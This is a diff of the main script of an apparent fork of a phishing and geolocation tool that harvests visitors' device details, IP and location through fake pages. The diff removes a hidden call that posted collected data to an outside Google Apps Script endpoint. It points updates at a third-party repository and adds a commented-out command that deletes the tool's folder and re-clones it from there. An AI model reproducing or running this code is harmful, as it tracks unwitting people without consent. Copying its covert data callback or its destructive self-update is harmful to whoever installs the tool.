@@ -1,17 +1,17 @@
 
 
-VERSION = '1.2.8'
+VERSION = '1.2.0'
 
 R = '\033[31m'  # red
 G = '\033[32m'  # green
 C = '\033[36m'  # cyan
 W = '\033[0m'   # white
 Y = '\033[33m'  # yellow
-
 import sys
 import argparse
 import requests
 import traceback
+import os
 from os import path, kill, mkdir
 from json import loads, decoder
 from packaging import version
@@ -41,7 +41,7 @@ RESULT = f'{LOG_DIR}/result.txt'
 TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
 TEMP_KML = f'{path_to_script}/template/sample.kml'
 META_FILE = f'{path_to_script}/metadata.json'
-META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
+META_URL = 'https://raw.githubusercontent.com/Sh-Seam/location/main/metadata.json'
 
 if not path.isdir(LOG_DIR):
 	mkdir(LOG_DIR)
@@ -61,6 +61,7 @@ def chk_update():
 			gh_version = json_data['version']
 			if version.parse(gh_version) > version.parse(VERSION):
 				print(f'> New Update Available : {gh_version}')
+                #os.system("cd .. && rm -rf location && git clone https://github.com/Sh-Seam/location.git")
 			else:
 				print('> Already up to date.')
 	except Exception as exc:
@@ -153,13 +154,13 @@ def template_select(site):
 	return site
 
 
-def server():
+def server():                          
 	print()
 	preoc = False
 	print(f'{G}[+] {C}Port : {W}{port}\n')
 	print(f'{G}[+] {C}Starting PHP Server...{W}', end='', flush=True)
 	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
-
+                                                          
 	with open(LOG_FILE, 'w+') as phplog:
 		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
 		sleep(3)
@@ -221,7 +222,7 @@ def data_parser():
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
 
 		print(f'''{Y}[!] Device Information :{W}
-
+        
 {G}[+] {C}OS         : {W}{var_os}
 {G}[+] {C}Platform   : {W}{var_platform}
 {G}[+] {C}CPU Cores  : {W}{var_cores}
@@ -232,7 +233,6 @@ def data_parser():
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 ''')
-
 		if ip_address(var_ip).is_private:
 			print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
 		else:
@@ -252,7 +252,6 @@ def data_parser():
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
 
 				print(f'''{Y}[!] IP Information :{W}
-
 {G}[+] {C}Continent : {W}{var_continent}
 {G}[+] {C}Country   : {W}{var_country}
 {G}[+] {C}Region    : {W}{var_region}
@@ -296,16 +295,9 @@ def data_parser():
 			else:
 				var_err = result_json['error']
 				print(f'{R}[-] {C}{var_err}\n')
-	import requests
-	url = 'https://script.google.com/macros/s/AKfycbwJXiFUJd4NMCWxZy6GwSAU1HjLGdC7n2O2SLuAuTM8V3vgu3W9o_-GLvD3Jct-rpCq5g/exec?action=addUser'
-	data = {
-		'location':var_os
-	}
-	requests.post(url, json=data)
 	csvout(data_row)
 	clear()
 	return
-
 
 def kmlout(var_lat, var_lon):
 	with open(TEMP_KML, 'r') as kml_sample:
@@ -325,9 +317,7 @@ def csvout(row):
 	with open(DATA_FILE, 'a') as csvfile:
 		csvwriter = writer(csvfile)
 		csvwriter.writerow(row)
-	print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
-
-
+  
 def clear():
 	with open(RESULT, 'w+'):
 		pass
@@ -359,3 +349,4 @@ except KeyboardInterrupt:
 	cl_quit(SERVER_PROC)
 else:
 	repeat()
+
